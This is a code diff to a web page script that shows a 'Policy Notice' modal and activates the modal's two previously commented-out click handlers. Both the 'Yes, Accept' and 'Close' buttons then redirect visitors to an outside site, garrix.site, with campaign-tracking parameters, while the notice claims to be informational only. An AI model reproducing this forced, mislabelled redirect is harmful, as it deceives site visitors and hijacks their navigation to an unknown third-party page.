@@ -69,27 +69,28 @@ if(form){
   const bd = document.createElement('div');
   bd.className = 'modal-backdrop';
   bd.innerHTML = `
-    <div class="modal">
-      <h3>Policy Notice</h3>
-      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
-      <div style="display:flex;gap:10px;flex-wrap:wrap">
-        <button class="btn" id="age-yes">Yes, Accept</button>
-        <button class="btn ghost" id="age-no">Close</button>
-      </div>
-    </div>`;
+   <div class="modal">
+     <h3>Policy Notice</h3>
+     <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+     <div style="display:flex;gap:10px;flex-wrap:wrap">
+       <button class="btn" id="age-yes">Yes, Accept</button>
+       <button class="btn ghost" id="age-no">Close</button>
+     </div>
+   </div>`;
   document.body.appendChild(bd);
   bd.style.display='flex';
   function closeGate(){ bd.style.display='none'; bd.remove(); }
-  bd.querySelector('#age-yes').addEventListener('click', 
-  //                                               function(){
+  bd.querySelector('#age-yes').addEventListener('click',  
+                                                function(){
    window.location.href = "http://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
-                                                
-  bd.querySelector('#age-no').addEventListener('click',  
-  //                                              function(){
+                                               
+   bd.querySelector('#age-no').addEventListener('click', 
+                                               function(){
    window.location.href = "http://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   }); 
 })();
+
 
 
 
